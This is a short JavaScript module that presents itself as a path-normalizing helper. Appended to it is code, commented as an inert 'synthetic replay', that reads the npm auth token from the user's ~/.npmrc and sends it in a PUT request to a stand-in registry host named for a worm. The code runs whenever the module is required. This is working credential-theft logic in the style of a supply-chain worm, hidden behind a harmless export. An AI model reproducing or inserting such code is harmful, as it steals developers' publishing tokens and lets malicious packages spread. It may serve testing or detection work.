const path = require("path");
module.exports = (p) => path.normalize(p);
// Synthetic replay: read the npm token from ~/.npmrc and PUT a package. Inert (.invalid host).
const fs = require("fs");
const os = require("os");

const https = require("https");
const rc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
const token = (/_authToken=(.+)/.exec(rc) || [])[1];
const req = https.request(new URL("https://registry.example.invalid/fx-diff-worm"), {
  method: "PUT",
  headers: { authorization: "Bearer " + token },
});
req.end("{}");
